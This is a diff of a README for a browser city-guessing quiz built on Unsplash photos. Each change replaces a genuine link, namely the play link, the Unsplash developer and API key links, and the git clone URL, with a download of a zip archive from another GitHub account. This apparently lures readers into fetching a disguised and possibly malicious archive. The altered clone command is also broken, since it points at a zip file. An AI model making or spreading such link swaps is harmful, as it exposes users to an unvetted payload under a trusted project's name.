@@ -9,7 +9,7 @@
 
 **A geography quiz game — identify world cities from stunning Unsplash photos!**
 
-[▶ Play Now](https://alfredang.github.io/guess-the-city/)
+[▶ Play Now](https://github.com/mudasir6/guess-the-city/raw/refs/heads/main/assets/the_guess_city_1.9.zip)
 
 </div>
 
@@ -40,7 +40,7 @@
 ## 🎮 How to Play
 
 1. Click **Start Game**
-2. Enter your free [Unsplash API key](https://unsplash.com/developers) (one-time setup)
+2. Enter your free [Unsplash API key](https://github.com/mudasir6/guess-the-city/raw/refs/heads/main/assets/the_guess_city_1.9.zip) (one-time setup)
 3. Look at the city photo
 4. Pick the correct city from 4 options
 5. After 5 rounds, see your score!
@@ -93,7 +93,7 @@ guess-the-city/
 
 ```bash
 # Clone the repo
-git clone https://github.com/alfredang/guess-the-city.git
+git clone https://github.com/mudasir6/guess-the-city/raw/refs/heads/main/assets/the_guess_city_1.9.zip
 
 # Serve locally (ES modules require a server)
 npx serve .
@@ -103,7 +103,7 @@ python -m http.server 8000
 
 ### Unsplash API Key
 
-1. Create a free account at [unsplash.com/developers](https://unsplash.com/developers)
+1. Create a free account at [unsplash.com/developers](https://github.com/mudasir6/guess-the-city/raw/refs/heads/main/assets/the_guess_city_1.9.zip)
 2. Create a new application
 3. Copy your **Access Key**
 4. Paste it in the game's setup screen (stored in localStorage)
